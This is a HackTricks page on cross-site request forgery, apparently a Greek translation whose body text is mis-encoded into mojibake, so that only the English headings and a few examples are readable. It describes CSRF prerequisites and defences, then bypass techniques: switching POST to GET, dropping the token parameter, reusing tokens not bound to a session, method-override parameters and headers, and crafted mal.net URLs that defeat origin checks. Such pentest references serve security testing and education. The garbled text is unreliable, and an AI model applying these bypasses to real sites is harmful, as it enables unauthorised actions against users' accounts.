# CSRF (Cross Site Request Forgery)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Join [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server to communicate with experienced hackers and bug bounty hunters!

**Hacking Insights**\
Engage with content that delves into the thrill and challenges of hacking

**Real-Time Hack News**\
Keep up-to-date with fast-paced hacking world through real-time news and insights

**Latest Announcements**\
Stay informed with the newest bug bounties launching and crucial platform updates

**Join us on** [**Discord**](https://discord.com/invite/N3FrSbmwdy) and start collaborating with top hackers today!

## Cross-Site Request Forgery (CSRF) Explained

**Cross-Site Request Forgery (CSRF)** ÎµÎ¯Î½Î±Î¹ Î­Î½Î±Ï‚ Ï„ÏÏ€Î¿Ï‚ ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î±Ï‚ Î±ÏƒÏ†Î±Î»ÎµÎ¯Î±Ï‚ Ï€Î¿Ï… Î²ÏÎ¯ÏƒÎºÎµÏ„Î±Î¹ ÏƒÎµ Î´Î¹Î±Î´Î¹ÎºÏ„Ï…Î±ÎºÎ­Ï‚ ÎµÏ†Î±ÏÎ¼Î¿Î³Î­Ï‚. Î•Ï€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ ÏƒÏ„Î¿Ï…Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï…Ï‚ Î½Î± ÎµÎºÏ„ÎµÎ»Î¿ÏÎ½ ÎµÎ½Î­ÏÎ³ÎµÎ¹ÎµÏ‚ ÎµÎº Î¼Î­ÏÎ¿Ï…Ï‚ Î±Î½Ï…Ï€Î¿ÏˆÎ¯Î±ÏƒÏ„Ï‰Î½ Ï‡ÏÎ·ÏƒÏ„ÏÎ½ ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…ÏŒÎ¼ÎµÎ½Î¿Î¹ Ï„Î¹Ï‚ Î±Ï…Î¸ÎµÎ½Ï„Î¹ÎºÎ¿Ï€Î¿Î¹Î·Î¼Î­Î½ÎµÏ‚ ÏƒÏ…Î½ÎµÎ´ÏÎ¯ÎµÏ‚ Ï„Î¿Ï…Ï‚. Î— ÎµÏ€Î¯Î¸ÎµÏƒÎ· ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹ ÏŒÏ„Î±Î½ Î­Î½Î±Ï‚ Ï‡ÏÎ®ÏƒÏ„Î·Ï‚, Î¿ Î¿Ï€Î¿Î¯Î¿Ï‚ ÎµÎ¯Î½Î±Î¹ ÏƒÏ…Î½Î´ÎµÎ´ÎµÎ¼Î­Î½Î¿Ï‚ ÏƒÎµ Î¼Î¹Î± Ï€Î»Î±Ï„Ï†ÏŒÏÎ¼Î± Î¸ÏÎ¼Î±, ÎµÏ€Î¹ÏƒÎºÎ­Ï€Ï„ÎµÏ„Î±Î¹ Î¼Î¹Î± ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Î· Î¹ÏƒÏ„Î¿ÏƒÎµÎ»Î¯Î´Î±. Î‘Ï…Ï„Î® Î· Î¹ÏƒÏ„Î¿ÏƒÎµÎ»Î¯Î´Î± ÏƒÏ„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹ÎµÎ¯ Î±Î¹Ï„Î®Î¼Î±Ï„Î± ÏƒÏ„Î¿Î½ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ Ï„Î¿Ï… Î¸ÏÎ¼Î±Ï„Î¿Ï‚ Î¼Î­ÏƒÏ‰ Î¼ÎµÎ¸ÏŒÎ´Ï‰Î½ ÏŒÏ€Ï‰Ï‚ Î· ÎµÎºÏ„Î­Î»ÎµÏƒÎ· JavaScript, Î· Ï…Ï€Î¿Î²Î¿Î»Î® Ï†Î¿ÏÎ¼ÏÎ½ Î® Î· Î»Î®ÏˆÎ· ÎµÎ¹ÎºÏŒÎ½Ï‰Î½.

### Prerequisites for a CSRF Attack

Î“Î¹Î± Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯ Î¼Î¹Î± ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î± CSRF, Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Ï€Î»Î·ÏÎ¿ÏÎ½Ï„Î±Î¹ Î±ÏÎºÎµÏ„Î­Ï‚ Ï€ÏÎ¿Ï‹Ï€Î¿Î¸Î­ÏƒÎµÎ¹Ï‚:

1. **Identify a Valuable Action**: ÎŸ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Î²ÏÎµÎ¹ Î¼Î¹Î± ÎµÎ½Î­ÏÎ³ÎµÎ¹Î± Ï€Î¿Ï… Î±Î¾Î¯Î¶ÎµÎ¹ Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯, ÏŒÏ€Ï‰Ï‚ Î· Î±Î»Î»Î±Î³Î® Ï„Î¿Ï… ÎºÏ‰Î´Î¹ÎºÎ¿Ï Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ Ï„Î¿Ï… Ï‡ÏÎ®ÏƒÏ„Î·, Ï„Î¿Ï… email Î® Î· Î±Î½Î±Î²Î¬Î¸Î¼Î¹ÏƒÎ· Î´Î¹ÎºÎ±Î¹Ï‰Î¼Î¬Ï„Ï‰Î½.
2. **Session Management**: Î— ÏƒÏ…Î½ÎµÎ´ÏÎ¯Î± Ï„Î¿Ï… Ï‡ÏÎ®ÏƒÏ„Î· Î¸Î± Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¯Î¶ÎµÏ„Î±Î¹ Î±Ï€Î¿ÎºÎ»ÎµÎ¹ÏƒÏ„Î¹ÎºÎ¬ Î¼Î­ÏƒÏ‰ cookies Î® Ï„Î·Ï‚ ÎºÎµÏ†Î±Î»Î¯Î´Î±Ï‚ HTTP Basic Authentication, ÎºÎ±Î¸ÏÏ‚ Î¬Î»Î»ÎµÏ‚ ÎºÎµÏ†Î±Î»Î¯Î´ÎµÏ‚ Î´ÎµÎ½ Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Ï€Î±ÏÎ±Ï€Î¿Î¹Î·Î¸Î¿ÏÎ½ Î³Î¹Î± Î±Ï…Ï„ÏŒÎ½ Ï„Î¿Î½ ÏƒÎºÎ¿Ï€ÏŒ.
3. **Absence of Unpredictable Parameters**: Î¤Î¿ Î±Î¯Ï„Î·Î¼Î± Î´ÎµÎ½ Î¸Î± Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Ï€ÎµÏÎ¹Î­Ï‡ÎµÎ¹ Î±Ï€ÏÏŒÎ²Î»ÎµÏ€Ï„ÎµÏ‚ Ï€Î±ÏÎ±Î¼Î­Ï„ÏÎ¿Ï…Ï‚, ÎºÎ±Î¸ÏÏ‚ Î±Ï…Ï„Î­Ï‚ Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Î±Ï€Î¿Ï„ÏÎ­ÏˆÎ¿Ï…Î½ Ï„Î·Î½ ÎµÏ€Î¯Î¸ÎµÏƒÎ·.

### Quick Check

ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± **ÎºÎ±Ï„Î±Î³ÏÎ¬ÏˆÎµÏ„Îµ Ï„Î¿ Î±Î¯Ï„Î·Î¼Î± ÏƒÏ„Î¿ Burp** ÎºÎ±Î¹ Î½Î± ÎµÎ»Î­Î³Î¾ÎµÏ„Îµ Ï„Î¹Ï‚ Ï€ÏÎ¿ÏƒÏ„Î±ÏƒÎ¯ÎµÏ‚ CSRF ÎºÎ±Î¹ Î³Î¹Î± Î½Î± Î´Î¿ÎºÎ¹Î¼Î¬ÏƒÎµÏ„Îµ Î±Ï€ÏŒ Ï„Î¿Î½ Ï€ÎµÏÎ¹Î·Î³Î·Ï„Î® Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎºÎ¬Î½ÎµÏ„Îµ ÎºÎ»Î¹Îº ÏƒÏ„Î¿ **Copy as fetch** ÎºÎ±Î¹ Î½Î± ÎµÎ»Î­Î³Î¾ÎµÏ„Îµ Ï„Î¿ Î±Î¯Ï„Î·Î¼Î±:

<figure><img src="../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>

### Defending Against CSRF

Î Î¿Î»Î»Î­Ï‚ Î±Î½Ï„ÎµÏ€Î¯Î¸ÎµÏƒÎµÎ¹Ï‚ Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± ÎµÏ†Î±ÏÎ¼Î¿ÏƒÏ„Î¿ÏÎ½ Î³Î¹Î± Î½Î± Ï€ÏÎ¿ÏƒÏ„Î±Ï„ÎµÏÏƒÎ¿Ï…Î½ Î±Ï€ÏŒ ÎµÏ€Î¹Î¸Î­ÏƒÎµÎ¹Ï‚ CSRF:

* [**SameSite cookies**](hacking-with-cookies/#samesite): Î‘Ï…Ï„ÏŒ Ï„Î¿ Ï‡Î±ÏÎ±ÎºÏ„Î·ÏÎ¹ÏƒÏ„Î¹ÎºÏŒ Î±Ï€Î¿Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î¿Î½ Ï€ÎµÏÎ¹Î·Î³Î·Ï„Î® Î±Ï€ÏŒ Ï„Î¿ Î½Î± ÏƒÏ„Î­Î»Î½ÎµÎ¹ cookies Î¼Î±Î¶Î¯ Î¼Îµ Î±Î¹Ï„Î®Î¼Î±Ï„Î± Î±Ï€ÏŒ Î¬Î»Î»ÎµÏ‚ Î¹ÏƒÏ„Î¿ÏƒÎµÎ»Î¯Î´ÎµÏ‚. [Î ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎ± Î³Î¹Î± Ï„Î± SameSite cookies](hacking-with-cookies/#samesite).
* [**Cross-origin resource sharing**](cors-bypass.md): Î— Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ® CORS Ï„Î·Ï‚ Î¹ÏƒÏ„Î¿ÏƒÎµÎ»Î¯Î´Î±Ï‚ Î¸ÏÎ¼Î±Ï„Î¿Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÏ€Î·ÏÎµÎ¬ÏƒÎµÎ¹ Ï„Î· Î´Ï…Î½Î±Ï„ÏŒÏ„Î·Ï„Î± Ï„Î·Ï‚ ÎµÏ€Î¯Î¸ÎµÏƒÎ·Ï‚, ÎµÎ¹Î´Î¹ÎºÎ¬ Î±Î½ Î· ÎµÏ€Î¯Î¸ÎµÏƒÎ· Î±Ï€Î±Î¹Ï„ÎµÎ¯ Ï„Î·Î½ Î±Î½Î¬Î³Î½Ï‰ÏƒÎ· Ï„Î·Ï‚ Î±Ï€Î¬Î½Ï„Î·ÏƒÎ·Ï‚ Î±Ï€ÏŒ Ï„Î·Î½ Î¹ÏƒÏ„Î¿ÏƒÎµÎ»Î¯Î´Î± Î¸ÏÎ¼Î±. [ÎœÎ¬Î¸ÎµÏ„Îµ Î³Î¹Î± Ï„Î·Î½ Ï€Î±ÏÎ¬ÎºÎ±Î¼ÏˆÎ· CORS](cors-bypass.md).
* **User Verification**: Î— Ï€ÏÎ¿Ï„ÏÎ¿Ï€Î® Î³Î¹Î± Ï„Î¿Î½ ÎºÏ‰Î´Î¹ÎºÏŒ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ Ï„Î¿Ï… Ï‡ÏÎ®ÏƒÏ„Î· Î® Î· ÎµÏ€Î¯Î»Ï…ÏƒÎ· ÎµÎ½ÏŒÏ‚ captcha Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÏ€Î¹Î²ÎµÎ²Î±Î¹ÏÏƒÎµÎ¹ Ï„Î·Î½ Ï€ÏÏŒÎ¸ÎµÏƒÎ· Ï„Î¿Ï… Ï‡ÏÎ®ÏƒÏ„Î·.
* **Checking Referrer or Origin Headers**: Î— ÎµÏ€Î¹ÎºÏÏÏ‰ÏƒÎ· Î±Ï…Ï„ÏÎ½ Ï„Ï‰Î½ ÎºÎµÏ†Î±Î»Î¯Î´Ï‰Î½ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î²Î¿Î·Î¸Î®ÏƒÎµÎ¹ Î½Î± Î´Î¹Î±ÏƒÏ†Î±Î»Î¹ÏƒÏ„ÎµÎ¯ ÏŒÏ„Î¹ Ï„Î± Î±Î¹Ï„Î®Î¼Î±Ï„Î± Ï€ÏÎ¿Î­ÏÏ‡Î¿Î½Ï„Î±Î¹ Î±Ï€ÏŒ Î±Î¾Î¹ÏŒÏ€Î¹ÏƒÏ„ÎµÏ‚ Ï€Î·Î³Î­Ï‚. Î©ÏƒÏ„ÏŒÏƒÎ¿, Î· Ï€ÏÎ¿ÏƒÎµÎºÏ„Î¹ÎºÎ® Î´Î¹Î±Î¼ÏŒÏÏ†Ï‰ÏƒÎ· Ï„Ï‰Î½ URLs Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï€Î±ÏÎ±ÎºÎ¬Î¼ÏˆÎµÎ¹ ÎºÎ±ÎºÏÏ‚ Ï…Î»Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î¿Ï…Ï‚ ÎµÎ»Î­Î³Ï‡Î¿Ï…Ï‚, ÏŒÏ€Ï‰Ï‚:
* Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ `http://mal.net?orig=http://example.com` (Ï„Î¿ URL Ï„ÎµÎ»ÎµÎ¹ÏÎ½ÎµÎ¹ Î¼Îµ Ï„Î¿ Î±Î¾Î¹ÏŒÏ€Î¹ÏƒÏ„Î¿ URL)
* Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ `http://example.com.mal.net` (Ï„Î¿ URL Î¾ÎµÎºÎ¹Î½Î¬ Î¼Îµ Ï„Î¿ Î±Î¾Î¹ÏŒÏ€Î¹ÏƒÏ„Î¿ URL)
* **Modifying Parameter Names**: Î— Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¯Î·ÏƒÎ· Ï„Ï‰Î½ Î¿Î½Î¿Î¼Î¬Ï„Ï‰Î½ Ï€Î±ÏÎ±Î¼Î­Ï„ÏÏ‰Î½ ÏƒÎµ Î±Î¹Ï„Î®Î¼Î±Ï„Î± POST Î® GET Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î²Î¿Î·Î¸Î®ÏƒÎµÎ¹ ÏƒÏ„Î·Î½ Î±Ï€Î¿Ï„ÏÎ¿Ï€Î® Î±Ï…Ï„Î¿Î¼Î±Ï„Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Ï‰Î½ ÎµÏ€Î¹Î¸Î­ÏƒÎµÏ‰Î½.
* **CSRF Tokens**: Î— ÎµÎ½ÏƒÏ‰Î¼Î¬Ï„Ï‰ÏƒÎ· ÎµÎ½ÏŒÏ‚ Î¼Î¿Î½Î±Î´Î¹ÎºÎ¿Ï CSRF token ÏƒÎµ ÎºÎ¬Î¸Îµ ÏƒÏ…Î½ÎµÎ´ÏÎ¯Î± ÎºÎ±Î¹ Î· Î±Ï€Î±Î¯Ï„Î·ÏƒÎ· Î±Ï…Ï„Î¿Ï Ï„Î¿Ï… token ÏƒÎµ ÎµÏ€ÏŒÎ¼ÎµÎ½Î± Î±Î¹Ï„Î®Î¼Î±Ï„Î± Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î¼ÎµÎ¹ÏÏƒÎµÎ¹ ÏƒÎ·Î¼Î±Î½Ï„Î¹ÎºÎ¬ Ï„Î¿Î½ ÎºÎ¯Î½Î´Ï…Î½Î¿ CSRF. Î— Î±Ï€Î¿Ï„ÎµÎ»ÎµÏƒÎ¼Î±Ï„Î¹ÎºÏŒÏ„Î·Ï„Î± Ï„Î¿Ï… token Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎ½Î¹ÏƒÏ‡Ï…Î¸ÎµÎ¯ Î¼Îµ Ï„Î·Î½ ÎµÏ€Î¹Î²Î¿Î»Î® CORS.

Î— ÎºÎ±Ï„Î±Î½ÏŒÎ·ÏƒÎ· ÎºÎ±Î¹ Î· ÎµÏ†Î±ÏÎ¼Î¿Î³Î® Î±Ï…Ï„ÏÎ½ Ï„Ï‰Î½ Î±Î¼Ï…Î½ÏÎ½ ÎµÎ¯Î½Î±Î¹ ÎºÏÎ¯ÏƒÎ¹Î¼Î· Î³Î¹Î± Ï„Î· Î´Î¹Î±Ï„Î®ÏÎ·ÏƒÎ· Ï„Î·Ï‚ Î±ÏƒÏ†Î¬Î»ÎµÎ¹Î±Ï‚ ÎºÎ±Î¹ Ï„Î·Ï‚ Î±ÎºÎµÏÎ±Î¹ÏŒÏ„Î·Ï„Î±Ï‚ Ï„Ï‰Î½ Î´Î¹Î±Î´Î¹ÎºÏ„Ï…Î±ÎºÏÎ½ ÎµÏ†Î±ÏÎ¼Î¿Î³ÏÎ½.

## Defences Bypass

### From POST to GET

ÎŠÏƒÏ‰Ï‚ Î· Ï†ÏŒÏÎ¼Î± Ï€Î¿Ï… Î¸Î­Î»ÎµÏ„Îµ Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯Ï„Îµ ÎµÎ¯Î½Î±Î¹ Ï€ÏÎ¿ÎµÏ„Î¿Î¹Î¼Î±ÏƒÎ¼Î­Î½Î· Î½Î± ÏƒÏ„ÎµÎ¯Î»ÎµÎ¹ Î­Î½Î± **POST Î±Î¯Ï„Î·Î¼Î± Î¼Îµ Î­Î½Î± CSRF token Î±Î»Î»Î¬**, Î¸Î± Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± **ÎµÎ»Î­Î³Î¾ÎµÏ„Îµ** Î±Î½ Î­Î½Î± **GET** ÎµÎ¯Î½Î±Î¹ ÎµÏ€Î¯ÏƒÎ·Ï‚ **Î­Î³ÎºÏ…ÏÎ¿** ÎºÎ±Î¹ Î±Î½ ÏŒÏ„Î±Î½ ÏƒÏ„ÎµÎ¯Î»ÎµÏ„Îµ Î­Î½Î± GET Î±Î¯Ï„Î·Î¼Î± Ï„Î¿ **CSRF token ÎµÎ¾Î±ÎºÎ¿Î»Î¿Ï…Î¸ÎµÎ¯ Î½Î± ÎµÏ€Î¹ÎºÏ…ÏÏÎ½ÎµÏ„Î±Î¹**.

### Lack of token

ÎŸÎ¹ ÎµÏ†Î±ÏÎ¼Î¿Î³Î­Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÏ†Î±ÏÎ¼ÏŒÏƒÎ¿Ï…Î½ Î­Î½Î±Î½ Î¼Î·Ï‡Î±Î½Î¹ÏƒÎ¼ÏŒ Î³Î¹Î± Î½Î± **ÎµÏ€Î¹ÎºÏ…ÏÏÎ½Î¿Ï…Î½ tokens** ÏŒÏ„Î±Î½ ÎµÎ¯Î½Î±Î¹ Ï€Î±ÏÏŒÎ½Ï„Î±. Î©ÏƒÏ„ÏŒÏƒÎ¿, Î¼Î¹Î± ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î± Ï€ÏÎ¿ÎºÏÏ€Ï„ÎµÎ¹ Î±Î½ Î· ÎµÏ€Î¹ÎºÏÏÏ‰ÏƒÎ· Ï€Î±ÏÎ±Î»ÎµÎ¯Ï€ÎµÏ„Î±Î¹ ÎµÎ½Ï„ÎµÎ»ÏÏ‚ ÏŒÏ„Î±Î½ Ï„Î¿ token ÎµÎ¯Î½Î±Î¹ Î±Ï€Î¿Ï…ÏƒÎ¯Î±. ÎŸÎ¹ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Î¹ Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„Î¿ÏÎ½ Î±Ï…Ï„ÏŒ Î±Ï†Î±Î¹ÏÏÎ½Ï„Î±Ï‚ Ï„Î·Î½ Ï€Î±ÏÎ¬Î¼ÎµÏ„ÏÎ¿ Ï€Î¿Ï… Ï†Î­ÏÎµÎ¹ Ï„Î¿ token, ÏŒÏ‡Î¹ Î¼ÏŒÎ½Î¿ Ï„Î·Î½ Ï„Î¹Î¼Î® Ï„Î¿Ï…. Î‘Ï…Ï„ÏŒ Ï„Î¿Ï…Ï‚ ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Î½Î± Ï€Î±ÏÎ±ÎºÎ¬Î¼ÏˆÎ¿Ï…Î½ Ï„Î· Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î± ÎµÏ€Î¹ÎºÏÏÏ‰ÏƒÎ·Ï‚ ÎºÎ±Î¹ Î½Î± Î´Î¹ÎµÎ¾Î¬Î³Î¿Ï…Î½ Î¼Î¹Î± ÎµÏ€Î¯Î¸ÎµÏƒÎ· Cross-Site Request Forgery (CSRF) Î±Ï€Î¿Ï„ÎµÎ»ÎµÏƒÎ¼Î±Ï„Î¹ÎºÎ¬.

### CSRF token is not tied to the user session

ÎŸÎ¹ ÎµÏ†Î±ÏÎ¼Î¿Î³Î­Ï‚ **Ï€Î¿Ï… Î´ÎµÎ½ ÏƒÏ…Î½Î´Î­Î¿Ï…Î½ Ï„Î± CSRF tokens Î¼Îµ Ï„Î¹Ï‚ ÏƒÏ…Î½ÎµÎ´ÏÎ¯ÎµÏ‚ Ï‡ÏÎ·ÏƒÏ„ÏÎ½** Ï€Î±ÏÎ¿Ï…ÏƒÎ¹Î¬Î¶Î¿Ï…Î½ ÏƒÎ·Î¼Î±Î½Ï„Î¹ÎºÏŒ **ÎºÎ¯Î½Î´Ï…Î½Î¿ Î±ÏƒÏ†Î±Î»ÎµÎ¯Î±Ï‚**. Î‘Ï…Ï„Î¬ Ï„Î± ÏƒÏ…ÏƒÏ„Î®Î¼Î±Ï„Î± ÎµÏ€Î±Î»Î·Î¸ÎµÏÎ¿Ï…Î½ Ï„Î± tokens Î­Î½Î±Î½Ï„Î¹ Î¼Î¹Î±Ï‚ **Ï€Î±Î³ÎºÏŒÏƒÎ¼Î¹Î±Ï‚ Î´ÎµÎ¾Î±Î¼ÎµÎ½Î®Ï‚** Î±Î½Ï„Î¯ Î½Î± Î´Î¹Î±ÏƒÏ†Î±Î»Î¯Î¶Î¿Ï…Î½ ÏŒÏ„Î¹ ÎºÎ¬Î¸Îµ token ÎµÎ¯Î½Î±Î¹ Î´ÎµÏƒÎ¼ÎµÏ…Î¼Î­Î½Î¿ Î¼Îµ Ï„Î· ÏƒÏ…Î½ÎµÎ´ÏÎ¯Î± Ï€Î¿Ï… Ï„Î¿ Î¾ÎµÎºÎ¯Î½Î·ÏƒÎµ.

Î‘ÎºÎ¿Î»Î¿Ï…Î¸ÎµÎ¯ Ï€ÏÏ‚ Î¿Î¹ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Î¹ ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏÎ¿Î½Ï„Î±Î¹ Î±Ï…Ï„ÏŒ:

1. **Authenticate** Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î¿Î½ Î´Î¹ÎºÏŒ Ï„Î¿Ï…Ï‚ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ.
2. **Obtain a valid CSRF token** Î±Ï€ÏŒ Ï„Î·Î½ Ï€Î±Î³ÎºÏŒÏƒÎ¼Î¹Î± Î´ÎµÎ¾Î±Î¼ÎµÎ½Î®.
3. **Use this token** ÏƒÎµ Î¼Î¹Î± ÎµÏ€Î¯Î¸ÎµÏƒÎ· CSRF ÎºÎ±Ï„Î¬ ÎµÎ½ÏŒÏ‚ Î¸ÏÎ¼Î±Ï„Î¿Ï‚.

Î‘Ï…Ï„Î® Î· ÎµÏ…Ï€Î¬Î¸ÎµÎ¹Î± ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ ÏƒÏ„Î¿Ï…Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï…Ï‚ Î½Î± ÎºÎ¬Î½Î¿Ï…Î½ Î¼Î· ÎµÎ¾Î¿Ï…ÏƒÎ¹Î¿Î´Î¿Ï„Î·Î¼Î­Î½Î± Î±Î¹Ï„Î®Î¼Î±Ï„Î± ÎµÎº Î¼Î­ÏÎ¿Ï…Ï‚ Ï„Î¿Ï… Î¸ÏÎ¼Î±Ï„Î¿Ï‚, ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…ÏŒÎ¼ÎµÎ½Î¿Î¹ Ï„Î¿Î½ **Î±Î½ÎµÏ€Î±ÏÎºÎ® Î¼Î·Ï‡Î±Î½Î¹ÏƒÎ¼ÏŒ ÎµÏ€Î¹ÎºÏÏÏ‰ÏƒÎ·Ï‚ token** Ï„Î·Ï‚ ÎµÏ†Î±ÏÎ¼Î¿Î³Î®Ï‚.

### Method bypass

Î‘Î½ Ï„Î¿ Î±Î¯Ï„Î·Î¼Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ Î¼Î¹Î± "**Ï€ÎµÏÎ¯ÎµÏÎ³Î·**" **Î¼Î­Î¸Î¿Î´Î¿**, ÎµÎ»Î­Î³Î¾Ï„Îµ Î±Î½ Î· **Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î±** **override** Ï„Î·Ï‚ Î¼ÎµÎ¸ÏŒÎ´Î¿Ï… Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³ÎµÎ¯. Î“Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±, Î±Î½ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ **Î¼Î­Î¸Î¿Î´Î¿ PUT** Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î´Î¿ÎºÎ¹Î¼Î¬ÏƒÎµÏ„Îµ Î½Î± **Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Î¼Î­Î¸Î¿Î´Î¿ POST** ÎºÎ±Î¹ **Î½Î± ÏƒÏ„ÎµÎ¯Î»ÎµÏ„Îµ**: _https://example.com/my/dear/api/val/num?**\_method=PUT**_

Î‘Ï…Ï„ÏŒ Î¼Ï€Î¿ÏÎµÎ¯ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î½Î± Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ ÏƒÏ„Î­Î»Î½Î¿Î½Ï„Î±Ï‚ Ï„Î·Î½ **Ï€Î±ÏÎ¬Î¼ÎµÏ„ÏÎ¿ \_method Î¼Î­ÏƒÎ± ÏƒÎµ Î­Î½Î± POST Î±Î¯Ï„Î·Î¼Î±** Î® Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î¹Ï‚ **ÎºÎµÏ†Î±Î»Î¯Î´ÎµÏ‚**:

* _X-HTTP-Method_
* _X-HTTP-Method-Override_
* _X-Method-Override_

### Custom header token bypass

Î‘Î½ Ï„Î¿ Î±Î¯Ï„Î·Î¼Î± Ï€ÏÎ¿ÏƒÎ¸Î­Ï„ÎµÎ¹ Î¼Î¹Î± **Ï€ÏÎ¿ÏƒÎ±ÏÎ¼Î¿ÏƒÎ¼Î­Î½Î· ÎºÎµÏ†Î±Î»Î¯Î´Î±** Î¼Îµ Î­Î½Î± **token** ÏƒÏ„Î¿ Î±Î¯Ï„Î·Î¼Î± Ï‰Ï‚ **Î¼Î­Î¸Î¿Î´Î¿ Ï€ÏÎ¿ÏƒÏ„Î±ÏƒÎ¯Î±Ï‚ CSRF**, Ï„ÏŒÏ„Îµ:

* Î”Î¿ÎºÎ¹Î¼Î¬ÏƒÏ„Îµ Ï„Î¿ Î±Î¯Ï„Î·Î¼Î± Ï‡Ï‰ÏÎ¯Ï‚ Ï„Î¿ **Î ÏÎ¿ÏƒÎ±ÏÎ¼Î¿ÏƒÎ¼Î­Î½Î¿ Token ÎºÎ±Î¹ ÎµÏ€Î¯ÏƒÎ·Ï‚ Ï„Î·Î½ ÎºÎµÏ†Î±Î»Î¯Î´Î±.**
